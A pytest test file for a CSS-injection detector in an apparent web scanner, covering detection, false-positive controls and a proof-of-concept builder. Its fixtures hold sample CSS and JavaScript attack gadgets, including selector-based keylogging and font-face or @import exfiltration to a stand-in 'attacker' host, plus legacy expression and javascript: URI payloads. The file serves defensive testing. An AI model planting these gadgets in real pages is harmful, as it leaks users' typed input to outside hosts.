"""Unit tests for the CSS Injection (CSSI) detection layer (Phase 30-1).

Tests cover:
  * analyze_page() on fixture HTML for each CSSI violation type.
  * Negative control: safe inline styles produce no violations.
  * build_poc_html() returns a non-empty string for each type.
  * Deduplication of repeated violations.
  * Edge cases: empty input, no <style> blocks, external scripts only.
"""
from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xssentinel.core import css_injection as cssi


# ---------------------------------------------------------------------------
# Fixture HTML samples
# ---------------------------------------------------------------------------
# Phase 140: gadget fixtures must show the CSS is USER-CONTROLLED, otherwise
# they are indistinguishable from a page shipping its own stylesheet (and
# the rule must not fire -- see GOOGLE_FONTS_HTML below).  The placeholder
# is written as <%= %> rather than {{ }} because _FONT_FACE_BLOCK_RE matches
# with [^}]* and a literal "}" would truncate the @font-face body.
FONT_FACE_HTML = (
    '<html><head><style>'
    '@font-face { font-family: exfil; src: url(<%= user_font %>); '
    'unicode-range: U+0041; }'
    'body { font-family: exfil; }'
    '</style></head><body>hi</body></html>'
)

KEYLOGGER_HTML = (
    '<html><head><style>'
    'input[value^="a"] { background: url(https://attacker/?a); }'
    'input[value^="b"] { background: url(https://attacker/?b); }'
    '</style></head><body><input value="secret"></body></html>'
)

IMPORT_HTML = (
    '<html><head><style>'
    '@import url(https://attacker/evil.css?theme=<%= user_theme %>);'
    'body { color: red; }'
    '</style></head><body>x</body></html>'
)

# Phase 140 -- SAFE pages that used to be reported as high.  A page that
# ships its own stylesheet matches the gadget patterns exactly: Google
# Fonts emits @font-face + unicode-range + an external src:url(), and a
# plain @import of a CDN is equally ordinary.  Neither is attacker-
# controlled, so neither may produce a finding.  Confirmed on OWASP Juice
# Shop, whose ONLY finding was a false css_font_face_exfil.
GOOGLE_FONTS_HTML = (
    '<html><head><style>'
    "@font-face{font-family:'VT323';font-style:normal;font-weight:400;"
    'font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/'
    "pxiKyp0ihIEF2isfFJU.woff2) format('woff2');"
    'unicode-range:U+0102-0103,U+0110-0111;}'
    'body{font-family:VT323}</style></head><body>shop</body></html>'
)

STATIC_IMPORT_HTML = (
    '<html><head><style>'
    '@import url(https://cdn.example/theme.css);'
    'body { color: red; }'
    '</style></head><body>x</body></html>'
)

CSSOM_HTML = (
    '<html><body><div id="x"></div>'
    '<script>'
    'var el = document.getElementById("x");'
    'el.style.cssText = "color:red;";'
    'el.style.background = "url(https://attacker/?leak)";'
    'var sheet = document.styleSheets[0];'
    'sheet.insertRule("body { margin: 0; }", 0);'
    'sheet.insertRule("@import url(https://attacker/x.css)", 1);'
    '</script></body></html>'
)

TEMPLATE_HTML = (
    '<html><head><style>'
    'body { color: {{ userColor }}; background: ${ userBg }; }'
    '</style></head><body>x</body></html>'
)

LEGACY_HTML = (
    '<html><head><style>'
    '#x { width: expression(alert(1)); }'
    '#y { behavior: url(xss.htc); }'
    '#z { -moz-binding: url(attacker.xml#xss); }'
    'body { background: url(javascript:alert(1)); }'
    '</style></head><body><div id="x"></div></body></html>'
)

DYNAMIC_EXFIL_HTML = (
    '<html><body>'
    '<script>'
    'var char = "a";'
    'var sel = \'input[value^="\' + char + \'"]\';'
    'var rule = sel + \' { background: url(https://attacker/?\' + char + \') }\';'
    'var s = document.createElement("style");'
    's.textContent = rule;'
    'document.head.appendChild(s);'
    '</script></body></html>'
)

SAFE_HTML = (
    '<html><head><style>'
    'body { color: #333; font-family: sans-serif; }'
    '</style></head>'
    '<body><div style="color:blue;">safe</div></body></html>'
)


# ---------------------------------------------------------------------------
# analyze_page tests
# ---------------------------------------------------------------------------
class TestAnalyzePage:
    def test_font_face_exfil_detected(self):
        result = cssi.analyze_page(FONT_FACE_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_font_face_exfil" in types

    def test_keylogger_exfil_detected(self):
        result = cssi.analyze_page(KEYLOGGER_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_selector_exfil" in types

    def test_import_detected(self):
        result = cssi.analyze_page(IMPORT_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_import_injection" in types

    def test_google_fonts_page_is_not_a_finding(self):
        """Phase 140: a page shipping its own webfont is not CSSI.

        Google Fonts emits exactly the gadget shape -- @font-face +
        unicode-range + an external src:url().  Reporting that as *high*
        made the scanner cry wolf on a large share of the real web; on
        OWASP Juice Shop it was the only finding, and it was false.
        """
        result = cssi.analyze_page(GOOGLE_FONTS_HTML)
        types = [v["type"] for v in result["violations"]]
        assert types == [], f"expected no violations, got {types}"

    def test_static_import_is_not_a_finding(self):
        """Phase 140: a page-authored @import of a CDN is not CSSI."""
        result = cssi.analyze_page(STATIC_IMPORT_HTML)
        types = [v["type"] for v in result["violations"]]
        assert types == [], f"expected no violations, got {types}"

    def test_gadget_requires_user_control_not_pretty_url(self):
        """The trigger must be user control, not an attacker-looking host.

        Same URL as IMPORT_HTML minus the template placeholder -- the only
        difference is that nothing here is attacker-controlled.
        """
        html = ('<html><head><style>'
                '@import url(https://attacker/evil.css);'
                '</style></head><body>x</body></html>')
        assert cssi.analyze_page(html)["violations"] == []

        with_marker = ('<html><head><style>'
                       '@import url(https://attacker/evil.css?u=XSSMARKER7);'
                       '</style></head><body>x</body></html>')
        types = [v["type"] for v in cssi.analyze_page(
            with_marker, extra_markers=["XSSMARKER7"])["violations"]]
        assert "css_import_injection" in types

    def test_short_marker_ignored(self):
        """A 1-2 char param name must not count as user-control evidence.

        ``q`` matches inside plenty of unrelated CSS identifiers, so short
        markers are skipped rather than trusted.
        """
        html = ('<html><head><style>'
                '@import url(https://attacker/evil.css?q=1);'
                '</style></head><body>x</body></html>')
        assert cssi.analyze_page(html,
                                 extra_markers=["q"])["violations"] == []

    def test_cssom_cssText_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_cssText" in types

    def test_cssom_background_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_background" in types

    def test_cssom_insertrule_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_insertrule" in types

    def test_cssom_insertrule_import_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_insertrule_import" in types

    def test_template_reflection_detected(self):
        result = cssi.analyze_page(TEMPLATE_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_template_reflection" in types

    def test_legacy_expression_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_expression" in types

    def test_legacy_behavior_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_behavior" in types

    def test_legacy_moz_binding_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_moz_binding" in types

    def test_legacy_javascript_uri_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_javascript_uri" in types

    def test_dynamic_exfil_gadget_detected(self):
        result = cssi.analyze_page(DYNAMIC_EXFIL_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_dynamic_exfil_gadget" in types


# ---------------------------------------------------------------------------
# Negative control
# ---------------------------------------------------------------------------
class TestNegativeControl:
    def test_safe_html_no_violations(self):
        result = cssi.analyze_page(SAFE_HTML)
        assert result["violations"] == [], \
            f"expected no violations, got: {[v['type'] for v in result['violations']]}"

    def test_empty_html_no_violations(self):
        assert cssi.analyze_page("")["violations"] == []

    def test_no_style_block_no_violations(self):
        html = '<html><body><p>no styles here</p></body></html>'
        assert cssi.analyze_page(html)["violations"] == []

    def test_external_script_only_no_cssom(self):
        """External script (src=) should not be scanned for CSSOM sinks."""
        html = ('<html><body>'
                '<script src="https://cdn/app.js"></script>'
                '</body></html>')
        result = cssi.analyze_page(html)
        cssom_types = [v["type"] for v in result["violations"]
                       if v["type"].startswith("cssom_")]
        assert cssom_types == []


# ---------------------------------------------------------------------------
# Violation structure
# ---------------------------------------------------------------------------
class TestViolationStructure:
    def test_each_violation_has_required_keys(self):
        result = cssi.analyze_page(LEGACY_HTML)
        for v in result["violations"]:
            assert "type" in v
            assert "severity" in v
            assert "title" in v
            assert "evidence" in v

    def test_severity_is_valid(self):
        result = cssi.analyze_page(LEGACY_HTML)
        valid = {"high", "medium", "low", "info"}
        for v in result["violations"]:
            assert v["severity"] in valid, f"invalid severity: {v['severity']}"

    def test_deduplication(self):
        """Repeated identical violations should be deduplicated."""
        html = (
            '<html><head><style>'
            '@import url(https://attacker/a.css?u=<%= theme %>);'
            '@import url(https://attacker/b.css?u=<%= theme %>);'
            '</style></head><body>x</body></html>'
        )
        result = cssi.analyze_page(html)
        import_count = sum(1 for v in result["violations"]
                           if v["type"] == "css_import_injection")
        # Both @imports have different evidence strings, so both should
        # be kept (dedup is by (type, evidence-prefix)).
        assert import_count == 2


# ---------------------------------------------------------------------------
# PoC builder
# ---------------------------------------------------------------------------
class TestBuildPoc:
    @pytest.mark.parametrize("vtype", [
        "css_context_escape", "css_font_face_exfil", "css_selector_exfil",
        "css_import_injection", "cssom_insertrule", "cssom_insertrule_import",
        "cssom_cssText", "css_javascript_uri", "css_expression",
        "css_moz_binding", "css_behavior", "css_template_reflection",
        "css_dynamic_exfil_gadget",
    ])
    def test_poc_returns_nonempty_string(self, vtype):
        poc = cssi.build_poc_html("http://example.com/", vtype)
        assert isinstance(poc, str)
        assert len(poc) > 10

    def test_unknown_type_returns_placeholder(self):
        poc = cssi.build_poc_html("http://example.com/", "unknown_type")
        assert "CSSI PoC" in poc


# ---------------------------------------------------------------------------
# Inline style attribute tests
# ---------------------------------------------------------------------------
class TestInlineStyleAttr:
    def test_javascript_uri_in_style_attr(self):
        html = '<div style="background:url(javascript:alert(1))">x</div>'
        result = cssi.analyze_page(html)
        types = [v["type"] for v in result["violations"]]
        assert "css_javascript_uri" in types

    def test_expression_in_style_attr(self):
        html = '<div style="width:expression(alert(1))">x</div>'
        result = cssi.analyze_page(html)
        types = [v["type"] for v in result["violations"]]
        assert "css_expression" in types

    def test_safe_style_attr_no_violation(self):
        html = '<div style="color:blue;font-size:14px;">x</div>'
        result = cssi.analyze_page(html)
        cssi_types = [v["type"] for v in result["violations"]]
        assert cssi_types == []
